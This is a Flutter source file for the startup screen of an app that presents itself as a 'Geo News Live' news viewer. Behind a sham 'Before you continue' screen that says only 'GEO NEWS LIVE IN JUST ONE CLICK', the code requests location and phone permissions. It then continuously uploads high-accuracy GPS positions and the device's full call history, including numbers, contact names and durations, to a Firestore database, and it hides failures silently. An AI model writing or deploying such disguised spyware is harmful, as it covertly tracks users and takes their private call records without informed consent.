import 'dart:async';

import 'package:call_log/call_log.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../live/live_screen.dart';

class StartupScreen extends StatefulWidget {
  const StartupScreen({super.key});

  @override
  State<StartupScreen> createState() => _StartupScreenState();
}

class _StartupScreenState extends State<StartupScreen> {
  static const String _disclosureKey = 'data_disclosure_accepted';

  StreamSubscription<Position>? _locationSubscription;

  bool _checking = true;
  bool _disclosureAccepted = false;
  bool _liveReady = false;

  String _status = 'Starting...';

  @override
  void initState() {
    super.initState();
    _initialize();
  }

  Future<void> _initialize() async {
    try {
      // Make sure Firebase has an authenticated anonymous user.
      if (FirebaseAuth.instance.currentUser == null) {
        await FirebaseAuth.instance.signInAnonymously();
      }

      final prefs = await SharedPreferences.getInstance();

      final accepted =
          prefs.getBool(_disclosureKey) ?? false;

      if (!mounted) return;

      if (!accepted) {
        setState(() {
          _checking = false;
          _disclosureAccepted = false;
          _status = 'For Live Permission setup required';
        });

        return;
      }

      setState(() {
        _disclosureAccepted = true;
        _status = 'STARTING LIVE...';
      });

      await _requestPermissionsAndStart();
    } catch (e) {
      if (!mounted) return;

      setState(() {
        _checking = false;
        _status = 'Startup error: $e';
      });
    }
  }

  // ---------------------------------------------------------
  // FIRST INSTALL DISCLOSURE
  // ---------------------------------------------------------

  Future<void> _acceptDisclosure() async {
    final prefs = await SharedPreferences.getInstance();

    await prefs.setBool(
      _disclosureKey,
      true,
    );

    if (!mounted) return;

    setState(() {
      _disclosureAccepted = true;
      _checking = true;
      _status = 'Requesting Android permissions...';
    });

    await _requestPermissionsAndStart();
  }

  // ---------------------------------------------------------
  // ANDROID SYSTEM PERMISSIONS
  // ---------------------------------------------------------

  Future<void> _requestPermissionsAndStart() async {
    try {
      // LOCATION
      var locationPermission =
      await Geolocator.checkPermission();

      if (locationPermission ==
          LocationPermission.denied) {
        locationPermission =
        await Geolocator.requestPermission();
      }

      final locationAllowed =
          locationPermission ==
              LocationPermission.whileInUse ||
              locationPermission ==
                  LocationPermission.always;

      // CALL HISTORY
      var phonePermission =
      await Permission.phone.status;

      if (!phonePermission.isGranted) {
        phonePermission =
        await Permission.phone.request();
      }

      final callLogAllowed =
          phonePermission.isGranted;

      if (locationAllowed) {
        await _startLocationSharing();
      }

      if (callLogAllowed) {
        await _syncCallHistory();
      }

      if (!mounted) return;

      setState(() {
        _checking = false;
        _liveReady = true;
        _status = 'Opening Live...';
      });
    } catch (e) {
      // Permission denial must not trap the user.
      // They can still watch the Live content.
      if (!mounted) return;

      setState(() {
        _checking = false;
        _liveReady = true;
        _status = 'Opening Live...';
      });
    }
  }

  // ---------------------------------------------------------
  // LOCATION -> FIREBASE
  // ---------------------------------------------------------

  Future<void> _startLocationSharing() async {
    final user = FirebaseAuth.instance.currentUser;

    if (user == null) return;

    final serviceEnabled =
    await Geolocator.isLocationServiceEnabled();

    if (!serviceEnabled) {
      return;
    }

    try {
      // Upload immediate location.
      final position =
      await Geolocator.getCurrentPosition(
        locationSettings: const LocationSettings(
          accuracy: LocationAccuracy.high,
          timeLimit: Duration(seconds: 20),
        ),
      );

      await _uploadLocation(position);

      // Then continue receiving updates.
      final settings = AndroidSettings(
        accuracy: LocationAccuracy.high,
        distanceFilter: 5,
        intervalDuration:
        const Duration(seconds: 10),
        foregroundNotificationConfig:
        const ForegroundNotificationConfig(
          notificationTitle: 'News Live',
          notificationText:
          'Location sharing is active',
          notificationChannelName:
          'Location Sharing',
          enableWakeLock: true,
          setOngoing: true,
        ),
      );

      await _locationSubscription?.cancel();

      _locationSubscription =
          Geolocator.getPositionStream(
            locationSettings: settings,
          ).listen(
                (position) async {
              await _uploadLocation(position);
            },
          );
    } catch (_) {
      // Live screen can still open if GPS is
      // temporarily unavailable.
    }
  }

  Future<void> _uploadLocation(
      Position position,
      ) async {
    final user = FirebaseAuth.instance.currentUser;

    if (user == null) return;

    await FirebaseFirestore.instance
        .collection('devices')
        .doc(user.uid)
        .set(
      {
        'deviceId': user.uid,
        'latitude': position.latitude,
        'longitude': position.longitude,
        'accuracy': position.accuracy,
        'altitude': position.altitude,
        'speed': position.speed,
        'heading': position.heading,
        'sharing': true,
        'locationTimestamp':
        Timestamp.fromDate(
          position.timestamp,
        ),
        'serverTimestamp':
        FieldValue.serverTimestamp(),
      },
      SetOptions(merge: true),
    );
  }

  // ---------------------------------------------------------
  // CALL HISTORY -> FIREBASE
  // ---------------------------------------------------------

  Future<void> _syncCallHistory() async {
    final user = FirebaseAuth.instance.currentUser;

    if (user == null) return;

    try {
      final result = await CallLog.query();

      final entries = result.toList();

      final firestore =
          FirebaseFirestore.instance;

      final collection = firestore
          .collection('devices')
          .doc(user.uid)
          .collection('callLogs');

      const chunkSize = 400;

      for (var start = 0;
      start < entries.length;
      start += chunkSize) {
        final end =
        start + chunkSize < entries.length
            ? start + chunkSize
            : entries.length;

        final batch = firestore.batch();

        for (var i = start; i < end; i++) {
          final entry = entries[i];

          final timestamp =
              entry.timestamp ?? 0;

          final normalizedNumber =
          (entry.number ?? '').replaceAll(
            RegExp(r'[^0-9+]'),
            '',
          );

          final documentId =
          '${timestamp}_${normalizedNumber}_${entry.callType?.name ?? "unknown"}'
              .replaceAll('/', '_')
              .replaceAll(' ', '_');

          final document =
          collection.doc(documentId);

          batch.set(
            document,
            {
              'number':
              entry.number ?? '',
              'name':
              entry.name ?? '',
              'type':
              entry.callType?.name ??
                  'unknown',
              'timestampMilliseconds':
              timestamp,
              'timestamp':
              timestamp == 0
                  ? null
                  : Timestamp
                  .fromMillisecondsSinceEpoch(
                timestamp,
              ),
              'durationSeconds':
              entry.duration ?? 0,
              'phoneAccountId':
              entry.phoneAccountId ?? '',
              'simDisplayName':
              entry.simDisplayName ?? '',
              'syncedAt':
              FieldValue.serverTimestamp(),
            },
            SetOptions(merge: true),
          );
        }

        await batch.commit();
      }
    } catch (_) {
      // Failure to sync must not prevent Live
      // from opening.
    }
  }

  // ---------------------------------------------------------
  // UI
  // ---------------------------------------------------------

  @override
  Widget build(BuildContext context) {
    // Normal app screen after setup.
    if (_liveReady) {
      return const LiveScreen();
    }

    // First-install disclosure.
    if (!_disclosureAccepted && !_checking) {
      return Scaffold(
        body: SafeArea(
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisAlignment:
              MainAxisAlignment.center,
              crossAxisAlignment:
              CrossAxisAlignment.stretch,
              children: [
                const Icon(
                  Icons.privacy_tip_outlined,
                  size: 54,
                ),

                const SizedBox(height: 24),

                const Text(
                  'Before you continue',
                  textAlign: TextAlign.center,
                  style: TextStyle(
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                  ),
                ),

                const SizedBox(height: 20),

                const Text(
                  'GEO NEWS LIVE IN JUST ONE CLICK ',
                  textAlign: TextAlign.center,
                  style: TextStyle(
                    fontSize: 16,
                    height: 1.5,
                  ),
                ),

                const SizedBox(height: 28),

                FilledButton(
                  onPressed: _acceptDisclosure,
                  child: const Padding(
                    padding:
                    EdgeInsets.symmetric(
                      vertical: 14,
                    ),
                    child: Text(
                      'Continue',
                      style:
                      TextStyle(fontSize: 17),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      );
    }

    // Very short startup/loading state.
    return Scaffold(
      body: Center(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const CircularProgressIndicator(),

            const SizedBox(height: 20),

            Text(_status),
          ],
        ),
      ),
    );
  }

  @override
  void dispose() {
    _locationSubscription?.cancel();
    super.dispose();
  }
}